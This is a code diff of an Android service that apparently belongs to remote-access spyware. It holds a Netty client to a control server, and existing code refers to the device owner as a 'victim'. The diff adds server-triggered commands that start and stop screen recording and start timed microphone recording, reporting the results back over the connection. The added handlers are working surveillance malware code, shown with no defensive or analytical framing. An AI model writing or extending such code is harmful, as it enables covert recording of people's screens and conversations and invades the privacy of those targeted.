@@ -23,7 +23,6 @@ import java.util.TimerTask;
 public class MainService extends Service {
     private static MainService _instance;
     private NettyClient nettyClient;
-    private RecordManager _recordManager;
 
     private final int INTERVAL_CONNECTION_MILLS = 60 * 1000; //интервал переподключения
 
@@ -36,6 +35,8 @@ public class MainService extends Service {
 
     private final String FILE_ISNT_DIRECTORY = "fileIsntDirectory";
     private final String FILE_IS_DIRECTORY = "fileIsDirectory";
+
+    private RecordManager recordManager;
 
     public static MainService getInstance() {
         return _instance;
@@ -50,7 +51,8 @@ public class MainService extends Service {
     public void onCreate() {
         _instance = this;
         Config.load(getSharedPreferences("Config", MODE_PRIVATE));
-        _recordManager = new RecordManager();
+        recordManager = new RecordManager();
+        //recordManager.startRecord(10*60*1000);
     }
 
     @Override
@@ -189,6 +191,26 @@ public class MainService extends Service {
                 if (Config.setName(name))
                     code = SUCCESS;
                 nettyClient.sendSetVictimName(code, (String) message.get("owner"));
+                break;
+            case "start.record.screen":
+                try {
+                    path = (String) message.get("path");
+                    int seconds = ((Long) message.get("seconds")).intValue();
+                    MainActivity.getInstance().startRecordScreen(seconds);
+                } catch (Exception e) {
+                    nettyClient.sendErrorCode(e.getMessage(), "test");
+                }
+                break;
+            case "stop.record.screen":
+                MainActivity.getInstance().stopRecordScreen();
+                break;
+            case "start.audio.record":
+                if (recordManager == null) recordManager = new RecordManager();
+                int seconds = ((Long) message.get("seconds")).intValue();
+                if (seconds == 0) return;
+                boolean result = recordManager.startRecord(seconds * 1000);
+                code = (result)? SUCCESS : ERROR;
+                nettyClient.sendStartAudioRecord(code, (String) message.get("owner"));
                 break;
             /*case "setOwner":
                 String owner = message.getString("owner");
